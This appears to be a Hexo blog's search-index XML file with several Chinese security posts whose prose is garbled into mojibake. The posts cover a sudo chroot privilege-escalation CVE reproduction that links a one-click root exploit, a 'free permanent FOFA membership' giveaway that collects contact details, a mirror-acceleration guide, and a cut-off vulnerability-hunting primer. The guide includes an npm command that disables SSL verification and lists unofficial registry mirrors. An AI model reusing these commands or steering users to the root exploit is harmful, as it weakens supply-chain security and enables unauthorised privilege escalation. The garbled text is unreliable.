<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘CVE-2025-32462/CVE-2025-32463æ¼æ´å¤ç°</title>
      <link href="/2025/07/02/VulnRep-CVE-2025-32463/"/>
      <url>/2025/07/02/VulnRep-CVE-2025-32463/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€CVE-2025-32462-CVE-2025-32463ç®€æ"><a href="#ä¸€ã€CVE-2025-32462-CVE-2025-32463ç®€æ" class="headerlink" title="ä¸€ã€CVE-2025-32462&#x2F;CVE-2025-32463ç®€æ"></a>ä¸€ã€CVE-2025-32462&#x2F;CVE-2025-32463ç®€æ</h1><p>Sudoä»1.9.14ç‰ˆæœ¬å¼€å§‹å¼•å…¥ä¸€ä¸ª-R&#x2F;â€“chrooté€‰é¡¹ï¼Œç”¨æ¥è®©ç”¨æˆ·é€šè¿‡è¯¥é€‰é¡¹æŒ‡å®šchrootçš„ç›®å½•ä¸‹æ‰§è¡Œå…·æœ‰rootæƒé™çš„å‘½ä»¤ï¼Œä¿è¯æ‰§è¡Œç¯å¢ƒçš„éš”ç¦»ã€‚ä½†å¿½ç•¥æŒ‡å®šæ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆrootææƒã€‚å…·ä½“å¯å‚è€ƒå¦‚ä¸‹ï¼š</p><blockquote><p>å½“sudoè§£æç”¨æˆ·ã€ç»„ã€ä¸»æœºåç­‰æƒé™è¿›è¡ŒåŒ¹é… glibc NSSï¼ˆName Service Switchï¼‰ æ—¶ï¼Œä¼šè§¦å‘ glibc NSSï¼ˆName Service Switch)æœºåˆ¶æˆ‘ä»¬å†™åœ¨è¯¥ç›®å½•ä¸‹çš„æ¶æ„åŠ¨æ€åº“ï¼Œä»è€Œå®ç°ææƒã€‚</p><p>æœ¬è´¨æ˜¯ï¼šNSSæ¨¡å—åŠ è½½åœ¨ rootæƒé™ä¸”åœ¨ sudoersæ£€æŸ¥ä¹‹å‰è§¦å‘ï¼Œå› æ­¤é€ æˆç»•è¿‡æƒé™æ§åˆ¶çš„ææƒã€‚</p></blockquote><h1 id="äºŒã€æ¶‰åŠç‰ˆæœ¬"><a href="#äºŒã€æ¶‰åŠç‰ˆæœ¬" class="headerlink" title="äºŒã€æ¶‰åŠç‰ˆæœ¬"></a>äºŒã€æ¶‰åŠç‰ˆæœ¬</h1><p>1.9.14 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17</p><h1 id="ä¸‰ã€æ¼æ´å¤ç°"><a href="#ä¸‰ã€æ¼æ´å¤ç°" class="headerlink" title="ä¸‰ã€æ¼æ´å¤ç°"></a>ä¸‰ã€æ¼æ´å¤ç°</h1><p>ä¸€é”®ææƒEXPï¼š<a href="https://github.com/Lusensec/CVE-2025-32463-POC">https://github.com/Lusensec/CVE-2025-32463-POC</a></p><p><img src="/img/VulnRep-CVE-2025-32463/image-20250702195655453.png" alt="image-20250702195655453"></p><p>ææƒç›¸å½“ä¹‹ä¸æ»‘</p><h1 id="å››ã€æ¼æ´ä¿®å¤"><a href="#å››ã€æ¼æ´ä¿®å¤" class="headerlink" title="å››ã€æ¼æ´ä¿®å¤"></a>å››ã€æ¼æ´ä¿®å¤</h1><p>ç›®å‰å®˜æ–¹å·²å‘å¸ƒå®‰å…¨æ›´æ–°ï¼Œå»ºè®®ç”¨æˆ·å°½å¿«å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬ï¼š</p><p>sudo &gt;&#x3D; 1.9.17p1</p><p>å®˜æ–¹è¡¥ä¸ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://www.sudo.ws/security/advisories/host_any/">https://www.sudo.ws/security/advisories/host_any/</a></p><p><a href="https://www.sudo.ws/security/advisories/chroot_bug">https://www.sudo.ws/security/advisories/chroot_bug</a></p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2025-32462/CVE-2025-32463 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä¿¡æ¯æ”¶é›†ã€‘æ°¸ä¹…ä¼šå‘˜FOFAä¿¡æ¯æ”¶é›†</title>
      <link href="/2025/06/14/Red-Team-Invasion-fofa/"/>
      <url>/2025/06/14/Red-Team-Invasion-fofa/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ğŸ”-FOFAé«˜çº§ä¼šå‘˜ï¼šç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„ç»ˆææƒ…æŠ¥æ­¦å™¨"><a href="#ä¸€ã€ğŸ”-FOFAé«˜çº§ä¼šå‘˜ï¼šç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„ç»ˆææƒ…æŠ¥æ­¦å™¨" class="headerlink" title="ä¸€ã€ğŸ” FOFAé«˜çº§ä¼šå‘˜ï¼šç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„ç»ˆææƒ…æŠ¥æ­¦å™¨"></a>ä¸€ã€ğŸ” FOFAé«˜çº§ä¼šå‘˜ï¼šç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„ç»ˆææƒ…æŠ¥æ­¦å™¨</h1><p>FOFAï¼ˆFingerprinting Organizations with Advanced Toolsï¼‰æ˜¯ä¸­å›½é¡¶å°–ç½‘ç»œå®‰å…¨å›¢é˜Ÿæ‰“é€ çš„<strong>ç½‘ç»œç©ºé—´æµ‹ç»˜å¼•æ“</strong>ï¼Œå ªç§°ç½‘ç»œå®‰å…¨ç•Œçš„â€è°·æ­Œâ€ã€‚å®ƒèƒ½å¤Ÿï¼š</p><ul><li>ğŸ–ï¸ <strong>ç²¾å‡†æŒ‡çº¹è¯†åˆ«</strong>ï¼šé€šè¿‡è®¾å¤‡æŒ‡çº¹ä¿¡æ¯ç²¾ç¡®å®šä½ç‰¹å®šè®¾å¤‡</li><li>ğŸ” <strong>æ¼æ´æ‰«æ</strong>ï¼šå†…ç½®æ¼æ´æ£€æµ‹åŠŸèƒ½ï¼Œå¿«é€Ÿå‘ç°å®‰å…¨éšæ‚£</li><li>ğŸ¯ <strong>æ™ºèƒ½æœç´¢</strong>ï¼šæ”¯æŒé«˜çº§æœç´¢è¯­æ³•ï¼Œå®ç°ç²¾å‡†ç›®æ ‡å®šä½</li><li>ğŸ“Š <strong>å¯è§†åŒ–åˆ†æ</strong>ï¼šæä¾›ç›´è§‚çš„å›¾è¡¨å±•ç¤ºï¼Œæ´å¯Ÿç½‘ç»œæ‹“æ‰‘</li><li>â³ <strong>å†å²å›æº¯</strong>ï¼šè®°å½•è®¾å¤‡å†å²ä¿¡æ¯ï¼Œè¿½è¸ªç½‘ç»œæ¼”å˜</li><li>ğŸ’» <strong>APIé›†æˆ</strong>ï¼šæ”¯æŒç¼–ç¨‹è°ƒç”¨ï¼Œæ— ç¼å¯¹æ¥å·¥ä½œæµç¨‹</li></ul><h1 id="äºŒã€ğŸ’-æ™®é€šä¼šå‘˜-vs-é«˜çº§ä¼šå‘˜ï¼šå¤©å£¤ä¹‹åˆ«"><a href="#äºŒã€ğŸ’-æ™®é€šä¼šå‘˜-vs-é«˜çº§ä¼šå‘˜ï¼šå¤©å£¤ä¹‹åˆ«" class="headerlink" title="äºŒã€ğŸ’ æ™®é€šä¼šå‘˜ vs é«˜çº§ä¼šå‘˜ï¼šå¤©å£¤ä¹‹åˆ«"></a>äºŒã€ğŸ’ æ™®é€šä¼šå‘˜ vs é«˜çº§ä¼šå‘˜ï¼šå¤©å£¤ä¹‹åˆ«</h1><p>FOFAæ™®é€šçš„æ³¨å†Œç”¨æˆ·æ— æ³•ä½¿ç”¨APIæ¥å£åŠŸèƒ½ï¼Œä¸”æƒç›Šååˆ†æœ‰é™ï¼š</p><ol><li>é¡µé¢æŸ¥è¯¢æ¬¡æ•° 300æ¬¡&#x2F;æœˆ</li><li>è·å–æ•°æ®é‡ 3000æ¡&#x2F;æœˆ</li><li>å¯ä½¿ç”¨è¯­æ³•58ä¸ª</li><li>é¡µé¢ä¸‹è½½åŠŸèƒ½</li><li>æ”¯æŒ1ä¸ªç”¨æˆ·ä½¿ç”¨</li></ol><p>æƒ³è¦æˆä¸ºé«˜çº§æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆï¼ŒFOFAæ˜¯ä¸€é—¨å¿…ä¿®è¯¾ï¼Œæ²¡æœ‰é«˜çº§ä¼šå‘˜æ€ä¹ˆèƒ½è¡Œï¼Ÿ</p><h1 id="ä¸‰ã€ğŸš€-æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜ï¼šæ¸—é€æµ‹è¯•çš„æ ¸æ­¦å™¨"><a href="#ä¸‰ã€ğŸš€-æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜ï¼šæ¸—é€æµ‹è¯•çš„æ ¸æ­¦å™¨" class="headerlink" title="ä¸‰ã€ğŸš€ æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜ï¼šæ¸—é€æµ‹è¯•çš„æ ¸æ­¦å™¨"></a>ä¸‰ã€ğŸš€ æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜ï¼šæ¸—é€æµ‹è¯•çš„æ ¸æ­¦å™¨</h1><p>æˆ‘ä»¬ç‹¬å®¶æä¾›çš„<strong>æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜</strong>æ‹¥æœ‰ä»¥ä¸‹è¶…å¼ºåŠŸèƒ½ï¼š</p><p><strong>æ— é™åˆ¶æŸ¥è¯¢</strong>ï¼šæ‰“ç ´æ¬¡æ•°é™åˆ¶ï¼Œæƒ³æŸ¥å°±æŸ¥</p><p><strong>å®Œæ•´è¯­æ³•æ”¯æŒ</strong>ï¼šè§£é”æ‰€æœ‰é«˜çº§æœç´¢è¯­æ³•</p><p><img src="/img/Red-Team-Invasion-fofa/image-20250614162954924.png" alt="image-20250614162954924"></p><p><strong>æµ·é‡æ•°æ®è·å–</strong>ï¼šè½»æ¾å¯¼å‡ºæ•°ä¸‡æ¡ç²¾å‡†æƒ…æŠ¥</p><p><strong>ä¸€é”®å¯¼å‡º</strong>ï¼šæ”¯æŒXLSXæ ¼å¼ï¼Œæ•°æ®åˆ†ææ›´ä¾¿æ·</p><p><img src="/img/Red-Team-Invasion-fofa/image-20250614163121902.png" alt="image-20250614163121902"></p><p><strong>å—¯~ç›¸å½“çš„nice</strong></p><p><img src="/img/Red-Team-Invasion-fofa/image-20250614163311230.png" alt="image-20250614163311230"></p><h1 id="å››ã€ğŸ-é™æ—¶ç¦åˆ©ï¼šå…è´¹è·å–æ°¸ä¹…ä¼šå‘˜"><a href="#å››ã€ğŸ-é™æ—¶ç¦åˆ©ï¼šå…è´¹è·å–æ°¸ä¹…ä¼šå‘˜" class="headerlink" title="å››ã€ğŸ é™æ—¶ç¦åˆ©ï¼šå…è´¹è·å–æ°¸ä¹…ä¼šå‘˜"></a>å››ã€ğŸ é™æ—¶ç¦åˆ©ï¼šå…è´¹è·å–æ°¸ä¹…ä¼šå‘˜</h1><p>â€œå·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨â€ã€‚ä½œä¸ºç½‘ç»œå®‰å…¨ä»ä¸šè€…ï¼Œæ²¡æœ‰FOFAé«˜çº§ä¼šå‘˜å°±åƒæˆ˜å£«æ²¡æœ‰æªï¼</p><p><strong>ç°åœ¨ç•™è¨€â€ç½‘ç»œå®‰å…¨â€å³å¯å…è´¹è·å–æ°¸ä¹…FOFAé«˜çº§ä¼šå‘˜èµ„æ ¼ï¼æˆªæ­¢æ—¶é—´åˆ°2027å¹´1æœˆ1æ—¥ï¼ï¼ï¼</strong></p><p>ğŸ“© è·å–æ–¹å¼ï¼š</p><ol><li>åœ¨è¯„è®ºåŒºç•™ä¸‹æ‚¨çš„è”ç³»æ–¹å¼</li><li>å…³æ³¨å¹¶ç§ä¿¡æˆ‘â€FOFAä¼šå‘˜â€</li><li>åŠ å…¥æˆ‘ä»¬çš„æŠ€æœ¯äº¤æµç¾¤è·å–</li></ol><blockquote><p>ğŸ’¡ ä¸“ä¸šæç¤ºï¼šä½¿ç”¨FOFAæ—¶è¯·éµå®ˆæ³•å¾‹æ³•è§„ï¼Œä»…ç”¨äºåˆæ³•æˆæƒçš„å®‰å…¨æµ‹è¯•ã€‚</p></blockquote><p>ç«‹å³è¡ŒåŠ¨ï¼Œæå‡æ‚¨çš„ç½‘ç»œå®‰å…¨ä½œæˆ˜èƒ½åŠ›ï¼âš¡</p><p><img src="/img/Red-Team-Invasion-fofa/weixin.jpg" alt="image-20250614163311230"></p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFAå¤§æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘å¸¸ç”¨åŠ é€Ÿæ–¹å¼</title>
      <link href="/2025/06/13/Nouns-accelerate/"/>
      <url>/2025/06/13/Nouns-accelerate/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€GithubåŠ é€Ÿæ‹‰å–"><a href="#ä¸€ã€GithubåŠ é€Ÿæ‹‰å–" class="headerlink" title="ä¸€ã€GithubåŠ é€Ÿæ‹‰å–"></a>ä¸€ã€GithubåŠ é€Ÿæ‹‰å–</h2><p>ä»¥ä¸‹åœ°å€æä¾›äº†GitHubæ‹‰å–çš„åŠ é€ŸæœåŠ¡ï¼š</p><ul><li><a href="https://hub.gitmirror.com/">https://hub.gitmirror.com</a></li><li><a href="https://ghps.cc/">https://ghps.cc</a></li><li><a href="https://gh.ddlc.top/">https://gh.ddlc.top</a></li><li><a href="https://js.jdpro.site/">https://js.jdpro.site</a></li><li><a href="https://mirror.ghproxy.com/">https://mirror.ghproxy.com</a></li></ul><p>ç›´æ¥åœ¨GitHubä»“åº“åœ°å€å‰åŠ å…¥åŸŸåå³å¯ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://hub.gitmirror.com/https://github.com/lzwme/ql-scripts.git</span><br></pre></td></tr></table></figure><h2 id="äºŒã€Pythonå›½å†…pipä¸‹è½½åŠ é€Ÿé•œåƒç«™"><a href="#äºŒã€Pythonå›½å†…pipä¸‹è½½åŠ é€Ÿé•œåƒç«™" class="headerlink" title="äºŒã€Pythonå›½å†…pipä¸‹è½½åŠ é€Ÿé•œåƒç«™"></a>äºŒã€Pythonå›½å†…pipä¸‹è½½åŠ é€Ÿé•œåƒç«™</h2><p>ä½¿ç”¨æ–¹æ³•å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line">pip install ddddocr -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€Dockerçš„åŠ é€Ÿåœ°å€"><a href="#ä¸‰ã€Dockerçš„åŠ é€Ÿåœ°å€" class="headerlink" title="ä¸‰ã€Dockerçš„åŠ é€Ÿåœ°å€"></a>ä¸‰ã€Dockerçš„åŠ é€Ÿåœ°å€</h2><blockquote><p>ç»™ &#x2F;etc&#x2F;docker&#x2F;daemon.json é…ç½®å¦‚ä¸‹åœ°å€</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">        &quot;https://docker.sunzishaokao.com&quot;,</span><br><span class="line">        &quot;https://docker.xuanyuan.me/&quot;,</span><br><span class="line">        &quot;https://docker.1ms.run&quot;,</span><br><span class="line">        &quot;https://docker.1panel.live&quot;,</span><br><span class="line">        &quot;https://hub.rat.dev&quot;,</span><br><span class="line">        &quot;https://docker.wanpeng.top&quot;,</span><br><span class="line">        &quot;https://doublezonline.cloud&quot;,</span><br><span class="line">        &quot;https://docker.mrxn.net&quot;,</span><br><span class="line">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="line">        &quot;https://dislabaiot.xyz&quot;,</span><br><span class="line">        &quot;https://docker.fxxk.dedyn.io&quot;,</span><br><span class="line">        &quot;https://docker-mirror.aigc2d.com&quot;,</span><br><span class="line">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="line">        &quot;https://docker.imgdb.de&quot;,</span><br><span class="line">        &quot;https://docker-0.unsee.tech&quot;,</span><br><span class="line">        &quot;https://docker.hlmirror.com&quot;,</span><br><span class="line">        &quot;https://cjie.eu.org&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="å››ã€npmä¸‹è½½åŠ é€Ÿ"><a href="#å››ã€npmä¸‹è½½åŠ é€Ÿ" class="headerlink" title="å››ã€npmä¸‹è½½åŠ é€Ÿ"></a>å››ã€npmä¸‹è½½åŠ é€Ÿ</h2><blockquote><p>cnpmæ˜¯æ·˜å®å›¢é˜Ÿç»´æŠ¤çš„å›½å†…npmé•œåƒç«™ï¼Œä»»ä½•æ¶‰åŠåˆ°npmå®‰è£…ä¸‹è½½çš„ï¼Œéƒ½å¯ä»¥æ¢æˆcnpmï¼Œå›½å†…çš„ä¸‹è½½é€Ÿåº¦å°†ä¼šæ›´å¿«ã€‚ä¸‹é¢ä»‹ç»å¦‚ä½•å®‰è£…cnpm</p></blockquote><p>æ–¹æ³•ä¸€ï¼šä¼ ç»Ÿå®‰è£…æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npmmirror.com  # å®‰è£…cnpm</span><br><span class="line">cnpm install åŒ…å    # é€šè¿‡cnpmå®‰è£…åŒ…</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚ä¸Šçš„æ–¹æ³•ä¹Ÿä¾ç„¶å®¹æ˜“å‡ºé”™ï¼Œå¯ä»¥ä½¿ç”¨æ–¹æ³•äºŒ</p><p>æ–¹æ³•äºŒï¼šå°ä¼—å®‰è£…æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean --force</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org --strict-ssl=false</span><br><span class="line">æˆ–è€…ä½¿ç”¨å¦‚ä¸‹</span><br><span class="line">npm install --registr=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><h2 id="äº”ã€cmdèµ°ä»£ç†åŠ é€Ÿæˆ–æ‹¦æˆª"><a href="#äº”ã€cmdèµ°ä»£ç†åŠ é€Ÿæˆ–æ‹¦æˆª" class="headerlink" title="äº”ã€cmdèµ°ä»£ç†åŠ é€Ÿæˆ–æ‹¦æˆª"></a>äº”ã€cmdèµ°ä»£ç†åŠ é€Ÿæˆ–æ‹¦æˆª</h2><p>åœ¨cmdæ‰§è¡Œå·¥å…·æˆ–å‘½ä»¤å‰å…ˆè¿›è¡Œå¦‚ä¸‹è®¾ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:8080</span><br><span class="line">set https_proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ é€Ÿæ–¹å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘æ¼æ´æŒ–æ˜ç»éªŒåˆ†äº«</title>
      <link href="/2025/05/24/Nouns-Vulnerability-mining/"/>
      <url>/2025/05/24/Nouns-Vulnerability-mining/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h1><p>æˆ‘è¿™é‡Œå¹¶ä¸è®²æ¼æ´æŒ–æ˜æ€è·¯ï¼Œè€Œæ˜¯æ¼æ´æŒ–æ˜ç»éªŒåˆ†äº«ã€‚ä¸»è¦æ˜¯ååŠ©å°ç™½ä¸Šæ‰‹æ¼æ´æŒ–æ˜ï¼Œæ­å¼€æ¼æ´æŒ–æ˜çš„ç¥ç§˜é¢çº±ã€‚å¸®åŠ©é‚£äº›æƒ³æŒ–æ¼æ´å´åˆæŒ–ä¸å€’ï¼Œæ„Ÿè§‰æŒ–æ´å°±æ˜¯æµªè´¹æ—¶é—´ã€ä¸€å¬åˆ°æŒ–æ´è¿˜ä¼šæ„Ÿåˆ°è«åâ€œææƒ§â€çš„å°ç™½åŒå­¦ã€‚<strong>å¤§ä½¬è·¯è¿‡å‹¿å–·ï¼Œæœ‰æƒ³æ³•çš„æ¬¢è¿åœ¨ä¸‹æ–¹ç•™è¨€ï¼</strong></p><p>é¦–å…ˆè¯´ä¸€ä¸‹æ¼æ´æŒ–æ˜çš„å‰æï¼š</p><ol><li><strong>OWASP Top 10</strong> æ¼æ´åŸºç¡€å¿…é¡»è¦æœ‰ï¼Œå¯¹åº”pikachuè¿™ç§é¶åœºï¼›</li><li>é€»è¾‘æ¼æ´æŒ–æ˜åŸºç¡€ï¼Œçœ‹äº›ç›¸å…³è¯¾ç¨‹ï¼Œè®¤çœŸåšå¥½ç¬”è®°ï¼›</li><li>fofaã€çˆ±ä¼æŸ¥ç­‰é«˜çº§APIç­‰ï¼Œç”¨äºä¿¡æ¯æ”¶é›†ï¼Œéå¿…é¡»ï¼Œæœ‰æ›¿ä»£å“æˆ–å…¶ä»–æ–¹å¼éƒ½å¯ä»¥ï¼›</li></ol><p>ä¸ºä»€ä¹ˆä¸è®²æ¼æ´æŒ–æ˜æ€è·¯å‘¢ï¼Ÿå› ä¸ºç°å®çš„æŒ–æ´é‡åˆ°çš„ç¯å¢ƒå„ä¸ç›¸åŒã€‚æ¯”å¦‚å„å…¬ä¼—å·åˆ†äº«é‚£äº›æ¼æ´æŒ–æ˜çš„æ–‡ç« ï¼Œåœ¨å®æˆ˜å½“ä¸­æ˜¯ä¸ä¼šæœ‰è·Ÿä»–ä¸€æ¨¡ä¸€æ ·çš„èµ„äº§ç¯å¢ƒï¼Œé™¤éæ˜¯æŸä¸ªæ¡†æ¶çš„ndayï¼Œä½†å¦‚æœåªè¿½æ±‚è¿™ç§ï¼Œé‚£æ— éå°±æ˜¯è·‘ä¸ªè„šæœ¬ï¼Œåšä¸ªè„šæœ¬å°å­äº†ã€‚è€Œä¸”æœ‰<strong>OWASP Top 10</strong> æ¼æ´å’Œé€»è¾‘æ¼æ´æŒ–æ˜æ€è·¯å®Œå…¨æ˜¯å¤Ÿç”¨çš„ï¼Œå…¶ä»–çš„æ— éå°±æ˜¯æŒ–æ´å§¿åŠ¿â€œéªšä¸éªšâ€ã€‚</p><h1 id="äºŒã€èµ„äº§åˆ’åˆ†"><a href="#äºŒã€èµ„äº§åˆ’åˆ†" class="headerlink" title="äºŒã€èµ„äº§åˆ’åˆ†"></a>äºŒã€èµ„äº§åˆ’åˆ†</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“èµ„äº§æ”¶é›†çš„é‡è¦æ€§ï¼Œé€šè¿‡ä¸€å †å·¥å…·å»æŒ–æ˜å­åŸŸåã€å°ç¨‹åºç­‰ï¼Œæ˜¯ä¸ºäº†è®©æˆ‘ä»¬æ”¶é›†åˆ°æ›´å¤šçš„èµ„äº§ï¼Œä»¥ä¾¿æ‰¾åˆ°å­˜åœ¨æ¼æ´èµ„äº§çš„è–„å¼±ç‚¹ã€‚åŒ…æ‹¬åœ¨HWè¿‡ç¨‹ä¸­ï¼Œçº¢é˜Ÿæˆå‘˜ä¹Ÿæ˜¯é€šè¿‡å¤§é‡çš„èµ„äº§æ”¶é›†ï¼Œå»æŒ–æ˜ç›®æ ‡çš„è–„å¼±èµ„äº§ï¼Œè¿›è€Œå‘èµ·æ”»å‡»ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘å°†æ”¶é›†åˆ°çš„èµ„äº§åˆ’åˆ†ä¸‰å¤§ç±»ï¼šä¸€ç±»èµ„äº§ã€äºŒç±»èµ„äº§ã€ä¸‰ç±»èµ„äº§ï¼Œå…·ä½“å«ä¹‰å¦‚ä¸‹</p><table><thead><tr><th>èµ„äº§ç­‰çº§</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>ä¸€ç±»èµ„äº§</td><td>é™æ€ç«™ç‚¹</td></tr><tr><td>äºŒç±»èµ„äº§</td><td>æœ‰äº¤äº’åŠŸèƒ½ï¼Œä½†æ˜¯æ— ç”¨æˆ·çš„ç«™ç‚¹</td></tr><tr><td>ä¸‰ç±»èµ„äº§</td><td>æœ‰ç”¨æˆ·æƒé™çš„ç«™ç‚¹</td></tr></tbody></table><p>æˆ‘ä»¬å¯¹æ”¶é›†åˆ°çš„èµ„äº§ï¼Œé¦–å…ˆå»é‡ã€è¿‡å­˜æ´»ä¹‹åï¼Œå°†å‰©ä¸‹çš„èµ„äº§åˆ’åˆ†ä»¥ä¸Šä¸‰ç±»ï¼Œä¸‹é¢æ˜¯å¯¹ä»¥ä¸Šä¸‰ç±»èµ„äº§çš„æ‰“æ³•ç»éªŒã€‚</p><h1 id="ä¸‰ã€ä¸€ç±»èµ„äº§æ‰“æ³•"><a href="#ä¸‰ã€ä¸€ç±»èµ„äº§æ‰“æ³•" class="headerlink" title="ä¸‰ã€ä¸€ç±»èµ„äº§æ‰“æ³•"></a>ä¸‰ã€ä¸€ç±»èµ„äº§æ‰“æ³•</h1><p>é™æ€ç«™ç‚¹ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨è¿™ä¸ªåšå®¢ç½‘ç«™ã€å„å¤§å®˜ç½‘ç«™ç‚¹ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰äº¤äº’åŠŸèƒ½ï¼Œé‡åˆ°è¿™ç§ç«™ç‚¹ç›´æ¥è·³è¿‡æµ‹è¯•ã€‚</p><p>ä½†æ˜¯ç»å¤§éƒ¨åˆ†çš„é™æ€ç«™ç‚¹æ˜¯ä¼ªé™æ€ï¼Œçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªé™æ€ç«™ç‚¹ï¼Œæ²¡ä»€ä¹ˆäº¤äº’ï¼Œä½†æ˜¯ç‚¹ç‚¹åˆ—è¡¨ã€æœç´¢æ¡†æœä¸€æœï¼Œç›¸å…³æ•°æ®æ˜¯ä¼ é€’åˆ°äº†åç«¯ï¼Œå®ç°äº†äº¤äº’åŠŸèƒ½ï¼›åˆæˆ–è€…é€šè¿‡ç›®å½•æ‰«æï¼Œæ‰«æåˆ°äº†æœ‰äº¤äº’åŠŸèƒ½çš„äºŒçº§ç›®å½•ç«™ç‚¹ï¼Œé‚£è¿™ç§å¯ä»¥æ”¾åœ¨äºŒç±»èµ„äº§ä¸­ã€‚</p><p>å› æ­¤ä¸€ç±»èµ„äº§åœ¨åˆ¤æ–­æ—¶è¦æ“¦äº®çœ¼ç›ï¼Œç©¶ç«Ÿæ˜¯ä¸€ç±»èµ„äº§ï¼Œè¿˜æ˜¯éšè—å¼çš„äºŒç±»èµ„äº§ã€‚åŒæ—¶ï¼Œä¸€æ—¦ç¡®å®šä¸ºä¸€ç±»èµ„äº§ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­ç›´æ¥è·³è¿‡æµ‹è¯•ã€‚</p><h1 id="å››ã€äºŒç±»èµ„äº§æ‰“æ³•"><a href="#å››ã€äºŒç±»èµ„äº§æ‰“æ³•" class="headerlink" title="å››ã€äºŒç±»èµ„äº§æ‰“æ³•"></a>å››ã€äºŒç±»èµ„äº§æ‰“æ³•</h1><p>è¿™ç§ç«™ç‚¹å°±æ˜¯æœ‰äº¤äº’åŠŸèƒ½ï¼Œä½†æ˜¯åˆæ²¡æœ‰ç”¨æˆ·æƒé™çš„ç«™ç‚¹ã€‚æœ€ç»å…¸çš„å°±æ˜¯å¸¸è¯´çš„å¼€å±€ä¸€ä¸ªç™»å½•æ¡†ã€‚è¿™é‡Œæˆ‘è¦ç»†åˆ†ä¸€ä¸‹ï¼Œå› ä¸ºäºŒç±»èµ„äº§æ˜¯æœ€å¸¸è§çš„èµ„äº§ç­‰çº§ã€‚</p><h2 id="1ã€æ— ç”¨æˆ·åŠŸèƒ½"><a href="#1ã€æ— ç”¨æˆ·åŠŸèƒ½" class="headerlink" title="1ã€æ— ç”¨æˆ·åŠŸèƒ½"></a>1ã€æ— 